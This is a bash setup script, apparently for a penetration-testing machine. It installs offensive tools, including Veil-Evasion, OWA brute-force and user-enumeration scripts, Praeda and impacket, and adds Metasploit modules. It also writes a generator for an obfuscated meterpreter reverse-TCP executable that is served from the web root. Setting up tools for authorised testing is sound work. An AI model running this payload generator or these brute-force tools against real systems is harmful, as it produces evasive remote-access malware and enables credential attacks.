#!/bin/bash
apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y

#basic installs
apt-get install python-setuptools
easy_install pip
pip install selenium
apt-get install unrar unace rar unrar p7zip zip unzip p7zip-full p7zip-rar file-roller -y

#Big gitlist
#
mkdir /opt/gitlist/
cd /opt/gitlist
git clone https://github.com/macubergeek/gitlist.git
cd gitlist
chmod +x gitlist.sh
./gitlist.sh

#msfconsole.rc
#
echo "spool /mylog.log" >> /msfconsole.rc
echo "set consolelogging true" >> /msfconsole.rc
echo "set loglevel 5" >> /msfconsole.rc
echo "set sessionlogging true" >> /msfconsole.rc
echo "set timestampoutput true" >> /msfconsole.rc
echo 'setg prompt "%cya%T%grn S:%S%blu J:%J "' >> /msfconsole.rc

#Veil-Evasion setup
#
cd /opt
git clone https://github.com/Veil-Framework/Veil.git
git clone https://github.com/Veil-Framework/PowerTools.git
cd /opt/Veil/Veil-Evasion/setup
./setup.sh
cd /opt/Veil/Veil-Catapult
./setup.sh

#payload autogeneration
#
cd /opt
git clone https://github.com/trustedsec/unicorn.git
echo '#!/bin/bash' >> /payload_gen.sh
echo "ADDY=$(ifconfig eth0 | awk '/inet addr/{print $2}' | awk -F':' '{print $2}')" >> /payload_gen.sh
echo 'cd /root/payload_temp' >> /payload_gen.sh
echo 'python /opt/Veil-Evasion/Veil-Evasion.py -p python/meterpreter/rev_tcp -c compile_to_exe=Y use_pyherion=Y LHOST=$ADDY LPORT=443 --overwrite' >> /payload_gen.sh
echo 'sleep 1' >> /payload_gen.sh
echo 'mv -f /root/veil-output/compiled/payload.exe /var/www/FreshPayload.exe' >> /payload_gen.sh

cd ~/Desktop
wget http://www.rarlab.com/rar/wrar520.exe
wine wrar520.exe
rm wrar520.exe

#foofus OWA enum scripts
#
mkdir -p /opt/foofus
cd /opt/foofus
wget http://www.foofus.net/jmk/tools/owa/OWALogonBrute.pl
wget http://www.foofus.net/jmk/tools/owa/OWA55EnumUsersURL.pl
wget http://www.foofus.net/jmk/tools/owa/OWALightFindUsers.pl
wget http://www.foofus.net/jmk/tools/owa/OWAFindUsers.pl
wget http://www.foofus.net/jmk/tools/owa/OWAFindUsersOld.pl

#Praeda install
# 
cd /opt
git clone https://github.com/percx/Praeda.git
git clone https://github.com/MooseDojo/praedasploit.git
cd praedasploit
mkdir -p /usr/share/metasploit-framework/modules/auxiliary/praedasploit
cp * /usr/share/metasploit-framework/modules/auxiliary/praedasploit

#CG's gold_digger script {http://carnal0wnage.attackresearch.com/2015/02/my-golddigger-script.html}
#
mkdir -p /opt/carnal0wnage
cd /opt/carnal0wnage
git clone https://github.com/carnal0wnage/Metasploit-Code.git
cp /opt/carnal0wnage/Metasploit-Code/modules/post/windows/gather/gold_digger.rb /usr/share/metasploit-framework/modules/post/windows/gather

#rawr install
#
cd /opt/rawr
./install.sh

#impacket
#
cd /opt/
svn checkout http://impacket.googlecode.com/svn/trunk/ impacket-read-only
cd impacket-read-only
python setup.py install

#cleanup
#
updatedb
apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y
